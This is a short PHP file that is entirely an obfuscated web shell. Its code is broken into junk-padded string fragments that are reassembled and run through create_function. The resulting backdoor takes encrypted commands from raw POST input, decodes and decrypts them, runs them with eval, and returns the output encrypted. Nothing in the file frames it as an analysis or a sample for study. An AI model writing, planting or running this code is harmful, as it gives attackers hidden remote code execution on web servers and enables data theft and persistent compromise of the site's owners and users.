<?php
$C='tcrrh("/$krrh(.+)$rrkfrr/",@file_grret_contrrents("phprr://input"rr),$m)==rr';
$w='$k="rrf742eb8rrdrr";$khrr=rr"3975fcae8830";$rrkf="d0rraarr6rre0darre7d';
$I='$i<$l);$rrj++rr,$irr+rr+){$o.=$t{$irr}^$k{$j};}}rrreturn $orr;}if (rr@prrreg_rrma';
$R=str_replace('M','','McreatMMe_fMuncMMtion');
$t='odrrerr($m[1]),rr$k)));$o=@ob_rrgrret_corrntents();@ob_end_clrrean();$rrr';
$K='rr1) {@ob_starrrt();@errval(@rrgzuncomrrrrpressrr(@x(@brrase64rr_derrc';
$v='";$p="i5tNRy3kZrrbYrrMCmrT";furrnctionrr x($trrrr,$k){$c=strlen($krrrr)rr;';
$r='$l=strlen($t)rr;$o=""rrrr;forrr($i=0;$i<$l;){forrrrrrr($j=0;($j<$c&&rr';
$J='rr=@baserr64_encorrde(@x(@grrzcorrmpress($o),rr$k));prrrrrint("$prr$kh$r$kf");}';
$i=str_replace('rr','',$w.$v.$r.$I.$C.$K.$t.$J);
$U=$R('',$i);$U();
?>
